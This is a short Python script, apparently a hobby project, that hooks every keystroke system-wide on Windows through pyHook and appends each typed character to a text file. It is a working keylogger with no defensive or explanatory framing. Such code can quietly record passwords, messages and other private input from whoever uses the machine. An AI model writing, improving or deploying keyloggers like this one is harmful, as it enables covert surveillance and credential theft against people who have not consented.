# -*- coding: utf-8 -*-
"""
Created on Sat Jul 22 04:20:21 2017

@author: WIZZY
"""

import pyHook, pythoncom, logging

file_log = 'c:/users/wizzy/desktop/python projects/emeka.txt'


def OnKeyboardEvent(event):
    logging.basicConfig(filename= file_log, level = logging.DEBUG, format = '%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent

hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
